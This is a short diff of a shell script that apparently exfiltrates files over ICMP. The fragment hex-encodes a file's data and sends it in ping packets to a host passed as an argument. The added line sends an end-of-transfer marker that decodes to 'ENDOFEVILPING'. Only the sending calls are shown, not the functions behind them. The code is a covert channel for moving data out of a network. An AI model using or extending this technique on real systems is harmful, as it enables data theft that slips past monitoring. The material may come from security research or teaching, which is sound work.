@@ -76,5 +76,5 @@ fi
 padded_hex_data=$( echo $(padding_data $file_hex_data) );
 
 send_icmp_packet $padded_hex_data $2;
+send_icmp_packet "000000454e444f464556494c50494e47" $2;
 echo -ne "[ DONE ] Script finish running\n";
-
